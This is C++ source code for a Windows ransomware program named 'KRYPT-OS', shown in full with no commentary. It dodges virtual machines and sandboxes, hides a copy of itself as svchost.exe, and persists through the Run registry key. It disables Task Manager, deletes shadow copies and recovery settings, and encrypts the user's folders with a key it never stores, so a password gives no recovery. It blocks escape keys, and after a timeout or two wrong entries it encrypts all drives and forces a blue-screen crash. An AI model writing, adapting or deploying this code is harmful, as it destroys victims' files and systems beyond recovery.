#include <windows.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <fstream>
#include <chrono>
#include <shlobj.h>
#include <tlhelp32.h>
#include <ctime>
#include <cstdio>
#include <thread>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")

const std::string PASSWORD = "krypt123";
const int MAX_ATTEMPTS = 2;
const int TIME_LIMIT = 240;
const std::string EXTENSION = ".krypt";

bool g_Running = true;
std::string g_PasswordInput = "";
int g_AttemptsLeft = MAX_ATTEMPTS;
int g_TimeLeft = TIME_LIMIT;
std::vector<std::string> g_Logs;
HHOOK g_hHook = NULL;
HWND g_hwnd = NULL;
HCRYPTPROV g_hCryptProv = NULL;
HCRYPTKEY g_hKey = NULL;

HFONT hFontMatrix = NULL;
HFONT hFontSkull = NULL;
HFONT hFontLog = NULL;
HFONT hFontUI = NULL;

struct MatrixDrop { int x, y, speed; std::string text; };
std::vector<MatrixDrop> g_MatrixRain;

bool IsBeingAnalyzed() {
    const char* vmProcesses[] = { "vmtoolsd.exe", "vmwareuser.exe", "VBoxService.exe", "VBoxTray.exe", "xenservice.exe", "qemu-ga.exe" };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnapshot, &pe)) {
            do {
                for (const char* vm : vmProcesses) {
                    if (strcmp(pe.szExeFile, vm) == 0) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    if (GetModuleHandleA("SbieDll.dll") || GetModuleHandleA("dbghelp.dll")) {
        return true;
    }
    
    return false;
}

bool InitCrypto() {
    if (!CryptAcquireContext(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptGenKey(g_hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &g_hKey)) return false;
    return true;
}

void EncryptFile(const std::string& fullPath, const std::string& fileName) {
    try {
        std::ifstream infile(fullPath, std::ios::binary);
        if (!infile.is_open()) return;

        std::string newPath = fullPath + EXTENSION;
        std::ofstream outfile(newPath, std::ios::binary);
        if (!outfile.is_open()) return;

        char buffer[4096];
        DWORD bytesRead;
        
        while (infile.read(buffer, sizeof(buffer)) || infile.gcount() > 0) {
            bytesRead = (DWORD)infile.gcount();
            DWORD dataLen = bytesRead;
            if (!CryptEncrypt(g_hKey, NULL, infile.eof(), 0, (BYTE*)buffer, &dataLen, sizeof(buffer))) break;
            outfile.write(buffer, dataLen);
        }
        infile.close();
        outfile.close();
        
        DeleteFileA(fullPath.c_str());
        g_Logs.push_back("[>] ENCRYPTED: " + fileName);
    } catch (...) {}
}

void EncryptDirectory(const std::string& dirPath) {
    try {
        std::string searchPath = dirPath + "\\*";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind == INVALID_HANDLE_VALUE) return;

        do {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
            std::string fullPath = dirPath + "\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                EncryptDirectory(fullPath);
            } else {
                std::string ext = EXTENSION;
                if (fullPath.length() > ext.length() && fullPath.substr(fullPath.length() - ext.length()) == ext) continue;
                
                if (fullPath.find("ntdll.dll") != std::string::npos || 
                    fullPath.find("kernel32.dll") != std::string::npos || 
                    fullPath.find("kernelbase.dll") != std::string::npos) {
                    continue; 
                }
                EncryptFile(fullPath, findData.cFileName);
                Sleep(1);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    } catch (...) {}
}

void TriggerBSOD() {
    typedef long NTSTATUS;
    typedef NTSTATUS(WINAPI* RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef NTSTATUS(WINAPI* NtRaiseHardError_t)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

    RtlAdjustPrivilege_t pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
    NtRaiseHardError_t pNtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");

    if (pRtlAdjustPrivilege && pNtRaiseHardError) {
        BOOLEAN b;
        ULONG response;
        pRtlAdjustPrivilege(19, TRUE, FALSE, &b);
        pNtRaiseHardError(0xC0000005, 0, 0, NULL, 6, &response);
    }
}

DWORD WINAPI TotalEncryptionThread(LPVOID) {
    g_Logs.push_back("[!] MAX ATTEMPTS REACHED. TOTAL DESTRUCTION INITIATED.");
    g_Logs.push_back("[!] ENCRYPTING ALL DRIVES...");
    
    char drives[256];
    GetLogicalDriveStringsA(256, drives);
    for (char* drive = drives; *drive != '\0'; drive += strlen(drive) + 1) {
        std::string root = drive;
        if (root.length() >= 2 && root[1] == ':') {
            EncryptDirectory(root);
        }
    }
    
    g_Logs.push_back("[!] DESTRUCTION COMPLETE. TRIGGERING BSOD IN 3 SECONDS.");
    Sleep(3000); 
    TriggerBSOD();
    return 0;
}

void TotalEncryption() {
    CreateThread(NULL, 0, TotalEncryptionThread, NULL, 0, NULL);
}

void KillProcess(const std::string& procName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (procName == pe.szExeFile) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) { TerminateProcess(hProcess, 0); CloseHandle(hProcess); }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

void DestroyBackups() {
    WinExec("vssadmin delete shadows /all /quiet", SW_HIDE);
    WinExec("wmic shadowcopy delete", SW_HIDE);
    WinExec("bcdedit /set {default} recoveryenabled No", SW_HIDE);
    g_Logs.push_back("[!] SHADOW COPIES DESTROYED.");
}

void AddToStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "KryptOsService", 0, REG_SZ, (const BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
    
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
    DWORD disable = 1;
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCloseKey(hKey);
}

void CopyToHiddenDir() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    std::string hiddenDir = std::string(appData) + "\\KryptOS";
    std::string hiddenExe = hiddenDir + "\\svchost.exe";
    
    if (std::string(currentPath) != hiddenExe) {
        CreateDirectoryA(hiddenDir.c_str(), NULL);
        SetFileAttributesA(hiddenDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        CopyFileA(currentPath, hiddenExe.c_str(), FALSE);
        ShellExecuteA(NULL, "open", hiddenExe.c_str(), NULL, NULL, SW_HIDE);
        ExitProcess(0);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        if (pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN || 
           (pKey->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) ||
           (pKey->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) ||
           (pKey->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000))) {
            return 1;
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

DWORD WINAPI BackgroundTasks(LPVOID) {
    DestroyBackups();
    AddToStartup();
    while (g_Running) {
        KillProcess("Taskmgr.exe");
        KillProcess("procexp.exe");
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI TimerThread(LPVOID) {
    while (g_Running && g_TimeLeft > 0) {
        Sleep(1000);
        g_TimeLeft--;
        if (g_hwnd) InvalidateRect(g_hwnd, NULL, TRUE);
    }
    if (g_TimeLeft <= 0 && g_Running) {
        g_Running = false;
        TotalEncryption();
    }
    return 0;
}

DWORD WINAPI EncryptionThread(LPVOID) {
    Sleep(1000);
    char userProfile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
    std::string p(userProfile);
    EncryptDirectory(p + "\\Desktop");
    EncryptDirectory(p + "\\Documents");
    EncryptDirectory(p + "\\Downloads");
    EncryptDirectory(p + "\\Pictures");
    g_Logs.push_back("[!] USER FILES ENCRYPTED.");
    return 0;
}

void InitFonts() {
    hFontMatrix = CreateFontA(14, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, "Consolas");
    hFontSkull = CreateFontA(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, "Consolas");
    hFontLog = CreateFontA(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, "Consolas");
    hFontUI = CreateFontA(28, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, "Consolas");
}

void InitMatrixRain(int width, int height) {
    g_MatrixRain.clear();
    const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
    for (int i = 0; i < 50; ++i) {
        MatrixDrop drop;
        drop.x = rand() % (width / 16) * 16;
        drop.y = -rand() % height;
        drop.speed = (rand() % 5) + 2;
        for (int j = 0; j < 15; ++j) { drop.text += chars[rand() % 39]; drop.text += "\n"; }
        g_MatrixRain.push_back(drop);
    }
}

void DrawUI(HDC hdc) {
    RECT rect;
    GetClientRect(g_hwnd, &rect);
    int w = rect.right, h = rect.bottom;

    HBRUSH bg = CreateSolidBrush(RGB(5, 5, 5));
    FillRect(hdc, &rect, bg);
    DeleteObject(bg);
    SetBkMode(hdc, TRANSPARENT);

    SelectObject(hdc, hFontMatrix);
    SetTextColor(hdc, RGB(0, 60, 0));
    for (size_t i = 0; i < g_MatrixRain.size(); ++i) {
        TextOutA(hdc, g_MatrixRain[i].x, g_MatrixRain[i].y, g_MatrixRain[i].text.c_str(), g_MatrixRain[i].text.length());
        g_MatrixRain[i].y += g_MatrixRain[i].speed;
        if (g_MatrixRain[i].y > h) g_MatrixRain[i].y = -200;
    }

    SelectObject(hdc, hFontSkull);
    SetTextColor(hdc, RGB(255, 20, 20));
    const char* skull = 
    "\n        ,@$$$$$.\n      .,$$$$$$$$i\n    .,z$\"\"')$$$$$$$$C`^#`-..\n ,zF'        `\"\"#*\"'       \"*o.\n"
    ",zXe>        u:..        ..      \"c\n,' zP'    ,:`\"          .            \"N.\n"
    ",d\",d$   ,'\"   ,uB\" .,uee..,?R.  ,  .    ^$.\n,@P d$\"     .:$$$$$$$$$$$$$@$CJN.,\"    `     #b\n"
    "z$\" d$P    :SM$$$$$$$$$$$$$$$$$$$Nf.           ^$.\nJ$\" J$P  , ,@$$$$$$$$$$$$$$$$$$$$$$$$$k.         \"$r\n"
    "z$   $$.   ,$$$$$$$$$$$$$$$$$$$$$$$$$$f'   .    .   $b\n$\"  :$$$$> 8.   `#$$$$$$$$$$$$$$$$$$$$$\"\\  d  .    F   $.\n";
    TextOutA(hdc, 20, 20, skull, strlen(skull));

    SelectObject(hdc, hFontLog);
    SetTextColor(hdc, RGB(200, 200, 200));
    int y = 20;
    for (int i = (int)g_Logs.size() - 1; i >= 0 && y < h - 200; --i) {
        TextOutA(hdc, w / 2, y, g_Logs[i].c_str(), g_Logs[i].length()); 
        y += 20;
    }

    SelectObject(hdc, hFontUI);
    SetTextColor(hdc, RGB(255, 255, 255));
    TextOutA(hdc, 20, h - 120, "ENTER DECRYPTION KEY:", 21);
    TextOutA(hdc, 20, h - 80, g_PasswordInput.c_str(), g_PasswordInput.length());
    
    if ((GetTickCount() / 500) % 2 == 0) {
        SetTextColor(hdc, RGB(255, 20, 20));
        TextOutA(hdc, 20 + (g_PasswordInput.length() * 14), h - 80, "_", 1);
    }

    char tStr[64];
    sprintf(tStr, "TIME LEFT: %02d:%02d", g_TimeLeft / 60, g_TimeLeft % 60);
    SetTextColor(hdc, RGB(255, 20, 20));
    TextOutA(hdc, w - 250, 20, tStr, strlen(tStr));

    SelectObject(hdc, hFontLog);
    SetTextColor(hdc, RGB(255, 20, 20));
    TextOutA(hdc, 20, h - 160, "KRYPT-OS v2.0 // ALL YOUR FILES ARE ENCRYPTED", 44);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        InitMatrixRain(GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
        InitFonts();
        break;
    case WM_CHAR:
        if (g_AttemptsLeft > 0) {
            if (wParam == VK_BACK && !g_PasswordInput.empty()) g_PasswordInput.pop_back();
            else if (wParam == VK_RETURN) {
                if (g_PasswordInput == PASSWORD) {
                    g_Logs.push_back("[+] KEY ACCEPTED. SYSTEM RESTORED.");
                    g_Running = false;
                    PostQuitMessage(0);
                } else {
                    g_AttemptsLeft--;
                    g_PasswordInput = "";
                    g_Logs.push_back("[!] INVALID KEY.");
                    if (g_AttemptsLeft <= 0) { 
                        TotalEncryption(); 
                    }
                }
            } else if (wParam >= 32 && wParam <= 126 && g_PasswordInput.length() < 20) {
                g_PasswordInput += (char)wParam;
            }
        }
        InvalidateRect(hwnd, NULL, TRUE);
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        DrawUI(hdc);
        EndPaint(hwnd, &ps);
    } break;
    case WM_TIMER: 
        InvalidateRect(hwnd, NULL, FALSE); 
        break;
    case WM_DESTROY: 
        PostQuitMessage(0); 
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int main() {
    if (IsBeingAnalyzed()) {
        return 0;
    }

    CopyToHiddenDir();
    if (!InitCrypto()) return 1;

    CreateThread(NULL, 0, BackgroundTasks, NULL, 0, NULL);
    CreateThread(NULL, 0, TimerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, EncryptionThread, NULL, 0, NULL);

    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WindowProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, "KryptClass", NULL };
    RegisterClassEx(&wc);
    g_hwnd = CreateWindow(wc.lpszClassName, "KRYPT-OS", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, wc.hInstance, NULL);
    
    SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    ShowWindow(g_hwnd, SW_SHOWMAXIMIZED);
    SetTimer(g_hwnd, 1, 50, NULL);

    MSG msg;
    while (g_Running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (g_hKey) CryptDestroyKey(g_hKey);
    if (g_hCryptProv) CryptReleaseContext(g_hCryptProv, 0);

    return 0;
} 